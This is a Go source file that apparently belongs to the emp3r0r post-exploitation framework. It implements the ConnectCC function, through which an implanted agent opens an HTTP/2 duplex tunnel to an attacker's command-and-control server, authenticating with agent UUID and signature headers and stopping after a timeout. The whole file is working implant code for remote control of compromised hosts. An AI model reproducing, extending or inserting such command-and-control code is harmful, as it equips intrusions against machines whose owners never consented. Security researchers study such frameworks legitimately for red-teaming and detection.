package c2transport

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/posener/h2conn"
)

// ConnectCC connect to CC with h2conn
func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
	var resp *http.Response
	defer func() {
		if conn == nil {
			err = fmt.Errorf("connectCC at %s failed", url)
			cancel()
		}
	}()

	// use h2conn for duplex tunnel
	ctx, cancel = context.WithCancel(context.Background())

	h2 := h2conn.Client{
		Client: def.HTTPClient,
		Header: http.Header{
			"AgentUUID":    {common.RuntimeConfig.AgentUUID},
			"AgentUUIDSig": {common.RuntimeConfig.AgentUUIDSig},
		},
	}
	log.Printf("ConnectCC: connecting to %s", url)
	go func() {
		conn, resp, err = h2.Connect(ctx, url)
		if err != nil {
			err = fmt.Errorf("connectCC: initiate h2 conn: %s", err)
			log.Print(err)
			cancel()
		}
		// Check server status code
		if resp != nil {
			if resp.StatusCode != http.StatusOK {
				err = fmt.Errorf("bad status code: %d", resp.StatusCode)
				return
			}
		}
	}()

	// kill connection on timeout
	countdown := 10
	for conn == nil && countdown > 0 {
		countdown--
		time.Sleep(time.Second)
	}

	return
}
